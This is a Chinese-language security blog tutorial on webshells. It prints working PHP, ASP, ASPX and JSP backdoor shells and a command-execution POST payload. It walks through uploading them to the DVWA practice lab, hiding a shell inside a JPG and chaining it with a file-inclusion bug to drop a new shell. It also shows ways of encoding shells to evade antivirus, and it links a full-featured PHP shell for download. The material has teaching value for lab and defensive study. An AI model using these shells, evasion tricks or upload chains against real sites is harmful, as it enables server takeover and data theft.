# 一句话木马

版权声明：本文为博主原创文章，遵循 CC 4.0 BY-SA 版权协议，转载请附上原文出处链接和本声明。 本文链接：[https://blog.csdn.net/weixin\_39190897/article/details/86772765](https://blog.csdn.net/weixin_39190897/article/details/86772765)

## 概述

在很多的渗透过程中，渗透人员会上传一句话木马（**简称Webshell**）到目前web服务目录继而提权获取系统权限，不论asp、php、jsp、aspx都是如此，那么一句话木马到底是什么呢?

先来看看最简单的一句话木马：

```text
   <?php @eval($_POST['attack']) ?>
1
```

【**基本原理**】利用**文件上传漏洞**，往目标网站中上传一句话木马，然后你就可以在本地通过中国菜刀`chopper.exe`即可获取和控制整个网站目录。@表示后面即使执行错误，也不报错。`eval（）`函数表示括号内的语句字符串什么的全都当做代码执行。`$_POST['attack']`表示从页面中获得attack这个参数值。

### 入侵条件

其中，只要攻击者满足三个条件，就能实现成功入侵：

```text
（1）木马上传成功，未被杀；
（2）知道木马的路径在哪；
（3）上传的木马能正常运行。
123
```

### 常见形式

常见的一句话木马：

```text
php的一句话木马： <?php @eval($_POST['pass']);?>
asp的一句话是：   <%eval request ("pass")%>
aspx的一句话是：  <%@ Page Language="Jscript"%> <%eval(Request.Item["pass"],"unsafe");%>
123
```

我们可以直接将这些语句插入到网站上的某个asp/aspx/php文件上，或者直接创建一个新的文件，在里面写入这些语句，然后把文件上传到网站上即可。

### 基本原理

首先我们先看一个原始而又简单的php一句话木马：

```text
   <?php @eval($_POST['cmd']); ?>
1
```

看到这里不得不赞美前辈的智慧。对于一个稍微懂一些php的人而言，或者初级的安全爱好者，或者脚本小子而言，**看到的第一眼就是密码是cmd**，通过post提交数据，但是具体如何执行的，却不得而知，下面我们分析一句话是如何执行的。

**这句话什么意思呢？**

（1）php的代码要写在`<?php ?>`里面，服务器才能认出来这是php代码，然后才去解析。  
 （2）`@`符号的意思是不报错，即使执行错误，也不报错。  
 ![&#x5728;&#x8FD9;&#x91CC;&#x63D2;&#x5165;&#x56FE;&#x7247;&#x63CF;&#x8FF0;](https://img-blog.csdnimg.cn/2019020720124034.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zOTE5MDg5Nw==,size_16,color_FFFFFF,t_70)  
 为什么呢？因为一个变量没有定义，就被拿去使用了，服务器就善意的提醒：Notice，你的xxx变量没有定义。这不就暴露了密码吗？所以我们加上`@`。

（3）为什么密码是cmd呢？

那就要来理解这句话的意思了。php里面几个超全局变量：`$_GET`、`$_POST`就是其中之一。`$_POST['a']`; 的意思就是a这个变量，用post的方法接收。

> 注释：传输数据的两种方法，get、post，post是在消息体存放数据，get是在消息头的url路径里存放数据（例如xxx.php?a=2）

（4）如何理解`eval()函数`？

**eval\(\)把字符串作为PHP代码执行**。

例如：`eval("echo 'a'")`;其实就等于直接 `echo 'a'`;再来看看`<?php eval($_POST['pw']); ?>`首先，用post方式接收变量pw，比如接收到了：`pw=echo 'a'`;这时代码就变成`<?php eval("echo 'a';"); ?>`。结果如下：  
 ![&#x5728;&#x8FD9;&#x91CC;&#x63D2;&#x5165;&#x56FE;&#x7247;&#x63CF;&#x8FF0;](https://img-blog.csdnimg.cn/20190207202044572.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zOTE5MDg5Nw==,size_16,color_FFFFFF,t_70)  
 连起来意思就是：用post方法接收变量pw，把变量pw里面的字符串当做php代码来执行。所以也就能这么玩：也就是说，你想执行什么代码，就把什么代码放进变量pw里，用post传输给一句话木马。你想查看目标硬盘里有没有小黄片，可以用php函数：`opendir()`和`readdir()`等等。想上传点小黄片，诬陷站主，就用php函数：`move_uploaded_file`，当然相应的html要写好。你想执行cmd命令，则用`exec()`。

当然前提是：php配置文件php.ini里，关掉安全模式`safe_mode = off`，然后再看看 禁用函数列表 disable\_functions = proc\_open, popen, exec, system, shell\_exec ，把exec去掉，确保没有exec（有些cms为了方便处理某些功能，会去掉的）。

来看看效果，POST代码如下：

```text
  cmd=header("Content-type:text/html;charset=gbk");
  exec("ipconfig",$out);
  echo '<pre>';
  print_r($out);
  echo '</pre>';
12345
```

在这里我们可以看到系统直接执行了系统命令。SO,大家现在应该理解，为什么说一句话短小精悍了吧！  
 ![&#x5728;&#x8FD9;&#x91CC;&#x63D2;&#x5165;&#x56FE;&#x7247;&#x63CF;&#x8FF0;](https://img-blog.csdnimg.cn/20190207202413808.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zOTE5MDg5Nw==,size_16,color_FFFFFF,t_70)

## 木马利用

以下通过DVWA的文件上传漏洞，来看看一句话木马如何使用。关于文件上传漏洞可阅读以下文章：[文件上传漏洞](https://blog.csdn.net/weixin_39190897/article/details/85334893)。

### 中国菜刀

【实验准备】首先在本地（桌面）保存一句话木马文件Hack.php\(用记事本编写后修改文件后缀即可）：

```text
  <?php @eval($_POST['pass']);?>
1
```

接下来进入DVWA平台：http://127.0.0.1:8088/DVWA/index.php ，准备开始实验。  
 ![&#x5728;&#x8FD9;&#x91CC;&#x63D2;&#x5165;&#x56FE;&#x7247;&#x63CF;&#x8FF0;](https://img-blog.csdnimg.cn/20190207204606543.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zOTE5MDg5Nw==,size_16,color_FFFFFF,t_70)  
 在Low 安全级别下,查看后台源码：

```text
 <?php
 if( isset( $_POST[ 'Upload' ] ) ) {
    // Where are we going to be writing to?
    $target_path  = DVWA_WEB_PAGE_TO_ROOT . "hackable/uploads/";
    $target_path .= basename( $_FILES[ 'uploaded' ][ 'name' ] );

    // Can we move the file to the upload folder?
    if( !move_uploaded_file( $_FILES[ 'uploaded' ][ 'tmp_name' ], $target_path ) ) {
        // No
        echo '<pre>Your image was not uploaded.</pre>';
    }
    else {
        // Yes!
        echo "<pre>{$target_path} succesfully uploaded!</pre>";
    }
  }
?>
1234567891011121314151617
```

从源码中发现，low级别未对上传的文件进行任何验证。所以可以直接上传PHP或者ASP一句话木马，此例采用php。

（1）我们将准备好的一句话木马直接上传，然后就可以看到回显的路径：  
 ![&#x5728;&#x8FD9;&#x91CC;&#x63D2;&#x5165;&#x56FE;&#x7247;&#x63CF;&#x8FF0;](https://img-blog.csdnimg.cn/20190207204704858.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zOTE5MDg5Nw==,size_16,color_FFFFFF,t_70)![&#x5728;&#x8FD9;&#x91CC;&#x63D2;&#x5165;&#x56FE;&#x7247;&#x63CF;&#x8FF0;](https://img-blog.csdnimg.cn/20190207204713616.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zOTE5MDg5Nw==,size_16,color_FFFFFF,t_70)  
 （2）接着就可以用菜刀连接了，菜刀界面右键，然后点击添加。然后填写相关的数据，如下图：  
 ![&#x5728;&#x8FD9;&#x91CC;&#x63D2;&#x5165;&#x56FE;&#x7247;&#x63CF;&#x8FF0;](https://img-blog.csdnimg.cn/20190207204734833.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zOTE5MDg5Nw==,size_16,color_FFFFFF,t_70)“中国菜刀”页面操作说明：

> 1、是连接的URL，就是网站的主路径然后加上上传文件时回显的保存路径；  
>  2、是菜刀连接时的密码，就是上面图片一句话提交的数据（本例为"pass"\)；  
>  3、是一句话的解析类型，可以是asp，php，aspx。不同的解析类型的一句话内容不一样，文件后缀名不一样。

（3）然后可以看连接成功的界面：  
 ![&#x5728;&#x8FD9;&#x91CC;&#x63D2;&#x5165;&#x56FE;&#x7247;&#x63CF;&#x8FF0;](https://img-blog.csdnimg.cn/20190207204811953.png)（4）接着双击或者右键“文件管理”，进入以下界面：  
 ![&#x5728;&#x8FD9;&#x91CC;&#x63D2;&#x5165;&#x56FE;&#x7247;&#x63CF;&#x8FF0;](https://img-blog.csdnimg.cn/20190207204827417.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zOTE5MDg5Nw==,size_16,color_FFFFFF,t_70)**我们看到了整个网站的结构和文件，甚至是暴漏了我整个电脑主机的磁盘存储！！可以进行任意非法增删查改！！网站（主机）至此沦陷……**  
 ![&#x5728;&#x8FD9;&#x91CC;&#x63D2;&#x5165;&#x56FE;&#x7247;&#x63CF;&#x8FF0;](https://img-blog.csdnimg.cn/20190207204845382.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zOTE5MDg5Nw==,size_16,color_FFFFFF,t_70)

### 图片木马

木马如何才能上传成功？通常防御者都会对类型、大小、进行过滤。另外，若规定是上传的图片，还会对图片进行采集。即使攻击者修改文件类型，也过不了图片采集那一关。所以，这就需要一张图片来做掩护。做成隐藏在图片下的木马。linux和windows都有相应的命令，能够让一个文件融合到另一个文件后面，达到隐藏的目的。

承接上面DVWA实验，High 安全等级，继续先查看源码：

```text
 <?php
 if( isset( $_POST[ 'Upload' ] ) ) {
    // Where are we going to be writing to?
    $target_path  = DVWA_WEB_PAGE_TO_ROOT . "hackable/uploads/";
    $target_path .= basename( $_FILES[ 'uploaded' ][ 'name' ] );

    // File information
    $uploaded_name = $_FILES[ 'uploaded' ][ 'name' ];
    $uploaded_ext  = substr( $uploaded_name, strrpos( $uploaded_name, '.' ) + 1);
    $uploaded_size = $_FILES[ 'uploaded' ][ 'size' ];
    $uploaded_tmp  = $_FILES[ 'uploaded' ][ 'tmp_name' ];

    // Is it an image?
    if( ( strtolower( $uploaded_ext ) == "jpg" || strtolower( $uploaded_ext ) == "jpeg" || strtolower( $uploaded_ext ) == "png" ) &&
        ( $uploaded_size < 100000 ) &&
        getimagesize( $uploaded_tmp ) ) {

        // Can we move the file to the upload folder?
        if( !move_uploaded_file( $uploaded_tmp, $target_path ) ) {
            // No
            echo '<pre>Your image was not uploaded.</pre>';
        }
        else {
            // Yes!
            echo "<pre>{$target_path} succesfully uploaded!</pre>";
        }
    }
    else {
        // Invalid file
        echo '<pre>Your image was not uploaded. We can only accept JPEG or PNG images.</pre>';
    }
 }
?>
123456789101112131415161718192021222324252627282930313233
```

可以看到，High级别的代码读取文件名中最后一个”.”后的字符串，期望通过文件名来限制文件类型，因此要求上传文件名形式必须是`“*.jpg”`、`“.jpeg”` 、`“*.png”`之一。同时，`getimagesize（）`函数更是限制了上传文件的**文件头必须为图像类型**。  
 ![&#x5728;&#x8FD9;&#x91CC;&#x63D2;&#x5165;&#x56FE;&#x7247;&#x63CF;&#x8FF0;](https://img-blog.csdnimg.cn/201902072051305.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zOTE5MDg5Nw==,size_16,color_FFFFFF,t_70)我们需要将上传文件的文件头伪装成图片，首先利用`copy命令`将一句话木马文件`Hack.php`与正常的图片文件`ClearSky.jpg`合并：  
 ![&#x5728;&#x8FD9;&#x91CC;&#x63D2;&#x5165;&#x56FE;&#x7247;&#x63CF;&#x8FF0;](https://img-blog.csdnimg.cn/20200508164334609.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zOTE5MDg5Nw==,size_16,color_FFFFFF,t_70)

> 【备注】以下为CMD下用copy命令制作“**图片木马**”的步骤，其中，`ClearSky.jpg/b`中“b”表示“**二进制文件**”，`hack.php/a`中“a"表示**ASCII码文件**。

![&#x5728;&#x8FD9;&#x91CC;&#x63D2;&#x5165;&#x56FE;&#x7247;&#x63CF;&#x8FF0;](https://img-blog.csdnimg.cn/20200508164506126.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zOTE5MDg5Nw==,size_16,color_FFFFFF,t_70)  
 生成带有木马的图片文件`hack.jpg`：  
 ![&#x5728;&#x8FD9;&#x91CC;&#x63D2;&#x5165;&#x56FE;&#x7247;&#x63CF;&#x8FF0;](https://img-blog.csdnimg.cn/20200508164551828.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zOTE5MDg5Nw==,size_16,color_FFFFFF,t_70)  
 接着我们打开生成的图片木马文件，我们可以看到一句话木马已附在图片文件末尾：  
 ![&#x5728;&#x8FD9;&#x91CC;&#x63D2;&#x5165;&#x56FE;&#x7247;&#x63CF;&#x8FF0;](https://img-blog.csdnimg.cn/20200508171013299.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zOTE5MDg5Nw==,size_16,color_FFFFFF,t_70)  
 然后我们试着将生成的木马图片文件`hack.jpg`上传，上传成功！！！  
 ![&#x5728;&#x8FD9;&#x91CC;&#x63D2;&#x5165;&#x56FE;&#x7247;&#x63CF;&#x8FF0;](https://img-blog.csdnimg.cn/20200508164821934.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zOTE5MDg5Nw==,size_16,color_FFFFFF,t_70)访问图片木马：  
 ![&#x5728;&#x8FD9;&#x91CC;&#x63D2;&#x5165;&#x56FE;&#x7247;&#x63CF;&#x8FF0;](https://img-blog.csdnimg.cn/20200508165230555.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zOTE5MDg5Nw==,size_16,color_FFFFFF,t_70)

**接下来，上菜刀**！！！！！！！！！！！  
 ![&#x5728;&#x8FD9;&#x91CC;&#x63D2;&#x5165;&#x56FE;&#x7247;&#x63CF;&#x8FF0;](https://img-blog.csdnimg.cn/20200508165406375.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zOTE5MDg5Nw==,size_16,color_FFFFFF,t_70)  
 但是由于是图片木马，PHP脚本并无法被解析，菜刀连接木马失败：  
 ![&#x5728;&#x8FD9;&#x91CC;&#x63D2;&#x5165;&#x56FE;&#x7247;&#x63CF;&#x8FF0;](https://img-blog.csdnimg.cn/20200508165338813.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zOTE5MDg5Nw==,size_16,color_FFFFFF,t_70)  
 既然图片木马也无法解析，那该怎么办？High级别的程序只允许上传图片啊……别慌，此处结合DVWA靶场自带的文件包含漏洞即可成功上传PHP木马并上菜刀连接了，下面进行攻击演示。

首先通过上述方法制造新的图片木马，图片文件后面的PHP脚本更改为：

```text
<?php fputs(fopen('muma.php','w'),'<?php @eval($_POST[hack]);?>'); ?>
1
```

然后制作新的图片木马，如下图所示：  
 ![&#x5728;&#x8FD9;&#x91CC;&#x63D2;&#x5165;&#x56FE;&#x7247;&#x63CF;&#x8FF0;](https://img-blog.csdnimg.cn/20200508172613752.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zOTE5MDg5Nw==,size_16,color_FFFFFF,t_70)  
 接着上传到DVWA，然后借助文件包含漏洞模块访问该木马文件：  
 ![&#x5728;&#x8FD9;&#x91CC;&#x63D2;&#x5165;&#x56FE;&#x7247;&#x63CF;&#x8FF0;](https://img-blog.csdnimg.cn/20200508173247835.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zOTE5MDg5Nw==,size_16,color_FFFFFF,t_70)访问的地址如下：`http://10.27.25.118:8088/DVWA/vulnerabilities/fi/?page=file:///C:\SoftWare\PhpStudy2016\WWW\DVWA\hackable\uploads\hacker.jpg`，如下图所示：  
 ![&#x5728;&#x8FD9;&#x91CC;&#x63D2;&#x5165;&#x56FE;&#x7247;&#x63CF;&#x8FF0;](https://img-blog.csdnimg.cn/20200508173400234.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zOTE5MDg5Nw==,size_16,color_FFFFFF,t_70)此时在DVWA文件包含漏洞的路径下便自动生成了PHP一句话木马脚本文件`muma.php`，如下图所示：  
 ![&#x5728;&#x8FD9;&#x91CC;&#x63D2;&#x5165;&#x56FE;&#x7247;&#x63CF;&#x8FF0;](https://img-blog.csdnimg.cn/20200508173834202.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zOTE5MDg5Nw==,size_16,color_FFFFFF,t_70)  
 此时再上菜刀连接，即可成功连接：  
 ![&#x5728;&#x8FD9;&#x91CC;&#x63D2;&#x5165;&#x56FE;&#x7247;&#x63CF;&#x8FF0;](https://img-blog.csdnimg.cn/20200508174303485.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zOTE5MDg5Nw==,size_16,color_FFFFFF,t_70)  
 ![&#x5728;&#x8FD9;&#x91CC;&#x63D2;&#x5165;&#x56FE;&#x7247;&#x63CF;&#x8FF0;](https://img-blog.csdnimg.cn/20200508174246769.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zOTE5MDg5Nw==,size_16,color_FFFFFF,t_70)

至此，我们成功结合文件包含漏洞，在只能上传图片的文件上传功能处上传图片木马并生成一句话木马。最后附上一篇博文，介绍了图片木马+解析漏洞的利用：[PHP图片木马](https://friday-go.cc/PHP%E5%9B%BE%E7%89%87%E6%9C%A8%E9%A9%AC)。

### 木马免杀

就算木马能正常运行，那么过段时间会不会被管理员杀掉？如何免杀？上面虽然木马上传成功了，但是只要管理员一杀毒，全部都能杀出来。而且，还会很明确的说这是后门。因此，作为攻击者就得会各种免杀技巧。防御者的防御很简单，什么时候哪个论坛爆出新的免杀技巧，安全人员立马将这玩意儿放入黑名单，那么这种免杀技巧就失效了。所以，攻击者得不断创新，发明新的免杀技巧。

【**免杀思路**】：

1、将源代码进行再次编码。  
 ![&#x5728;&#x8FD9;&#x91CC;&#x63D2;&#x5165;&#x56FE;&#x7247;&#x63CF;&#x8FF0;](https://img-blog.csdnimg.cn/20190207210022815.png)2、将那一句话木马进行base64编码，存放在"乱七八糟"的代码中，直接看图：  
 ![&#x5728;&#x8FD9;&#x91CC;&#x63D2;&#x5165;&#x56FE;&#x7247;&#x63CF;&#x8FF0;](https://img-blog.csdnimg.cn/20190207210041617.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zOTE5MDg5Nw==,size_16,color_FFFFFF,t_70)3、还是一句话木马，进行变形，只不过，这次的变形是在数组中键值对变形。很强。  
 ![&#x5728;&#x8FD9;&#x91CC;&#x63D2;&#x5165;&#x56FE;&#x7247;&#x63CF;&#x8FF0;](https://img-blog.csdnimg.cn/20190207210110393.png)  
 不得不说，免杀的思路真是越猥琐，越好。研究起来非常有意思。以后等我渗透熟练了，会好好研究一下PHP代码的各种免杀技巧。很好玩，思路很猥琐。

## 小马和大马

**小马和大马都是网页类型中的一种后门，是通过用来控制网站权限的**，那**最主要的区别就是小马是用来上传大马的**。通过小马上传大马，这时候有个疑问了，那不是多此一举了，为什么要用小马来上传大马，而干嘛不直接上传大马用好了。其实这里是因为小马体积小，有比大马更强的隐蔽优势，而且有针对文件大小上传限制的漏洞，所以才有小马，小马也通常用来做留备用后门等。

### 网页小马

小马体积非常小，只有2KB那么大，隐蔽性也非常的好，因为小马的作用很简单，就是一个上传功能，就没有其它的了，它的作用仅仅是用来上传文件，所以也能过一些安全扫描。小马是为了方便上传大马的，因为很多漏洞做了上传限制，大马上传不了，所以就只能先上传小马，再接着通过小马上传大马了。小马还可以通过与图片合成一起通过IIS漏洞来运行。

Java语言编写的后台咱们使用JSP木马，与前面的一句话木马不同，菜刀中JSP木马较长，以下是一个简单的JSP小马：

```text
<%
    if("123".equals(request.getParameter("pwd"))){
        java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter("i")).getInputStream();
        int a = -1;
        byte[] b = new byte[2048];
        out.print("<pre>");
        while((a=in.read(b))!=-1){
            out.println(new String(b));
        }
        out.print("</pre>");
    }
%>
123456789101112
```

成功上传后如果能解析的话，请求：`http://服务器IP:端口/Shell/cmd.jsp?pwd=123&i=ipconfig` 即可执行命令。

### 网页大马

大马的体积就比较大了，通常在50K左右，比小马会大好多倍，但对应的功能也很强大，包括对数据的管理，命令的操作，数据库的管理，解压缩，和提权等功能，都非常强大。这种大马一旦网站被种了，网站基本就在这个大马控制之中。大马的隐蔽性不好，因为涉及很多敏感代码，安全类程序很容易扫描到。

> 中国菜刀的一句话不算，菜刀一句话通过客户端来操作也非常强大，一句话的代码可以和大马实现的一样。我们这里说的小马和大马是指网页类型中的，小马就是为了配合上传大马的，这是它最主要的作用，还有就是小马可以当做备用的后门来使用，一般大马容易被发现，而小马则更容易隐藏在系统的文件夹中。

来看看一个大马利用实例：在虚拟机中往DVWA上传PHP大马（源码附在最后）:  
 ![&#x5728;&#x8FD9;&#x91CC;&#x63D2;&#x5165;&#x56FE;&#x7247;&#x63CF;&#x8FF0;](https://img-blog.csdnimg.cn/2020050815202288.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zOTE5MDg5Nw==,size_16,color_FFFFFF,t_70)  
 访问木马文件`123.php`，提交密码123456后进入大马的功能列表，下图所示为文件管理功能：  
 ![&#x5728;&#x8FD9;&#x91CC;&#x63D2;&#x5165;&#x56FE;&#x7247;&#x63CF;&#x8FF0;](https://img-blog.csdnimg.cn/20200508152127955.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zOTE5MDg5Nw==,size_16,color_FFFFFF,t_70)继续访问下命令执行功能（其他功能不展示了）：  
 ![&#x5728;&#x8FD9;&#x91CC;&#x63D2;&#x5165;&#x56FE;&#x7247;&#x63CF;&#x8FF0;](https://img-blog.csdnimg.cn/20200508152318368.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zOTE5MDg5Nw==,size_16,color_FFFFFF,t_70)

> 最后附上该PHP大马的代码（代码太长，百度云盘链接）：`https://pan.baidu.com/s/1XGUp5Q_Q2zn46kcQxE5M3A`  
>  提取码：56pd。另外提供JSP大马的参考地址：`https://blog.csdn.net/weixin_34248023/article/details/93094456`。

### WebShell

**Webshell就是以asp、php、jsp或者cgi等网页文件形式存在的一种命令执行环境，也可以将其称做为一种网页后门**。黑客在入侵了一个网站后，通常会将asp或php后门文件与网站服务器WEB目录下正常的网页文件混在一起，然后就可以使用浏览器来访问asp或者php后门，**得到一个命令执行环境，以达到控制网站服务器的目的**。

webshell根据脚本可以分为PHP脚本木马，ASP脚本木马，也有基于.NET的脚本木马和JSP脚本木马。在国外，还有用python脚本语言写的动态网页，当然也有与之相关的webshell。 **webshell根据功能也分为大马、小马和一句话木马**，例如：`<%eval request(“pass”)%>`通常把这句话写入一个文档里面，然后文件名改成xx.asp。然后传到服务器上面。用eval方法将`request(“pass”)`转换成代码执行，request函数的作用是应用外部文件。**这相当于一句话木马的客户端配置**。具体分类如下图：  
 ![&#x5728;&#x8FD9;&#x91CC;&#x63D2;&#x5165;&#x56FE;&#x7247;&#x63CF;&#x8FF0;](https://img-blog.csdnimg.cn/20190228172302872.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zOTE5MDg5Nw==,size_16,color_FFFFFF,t_70)

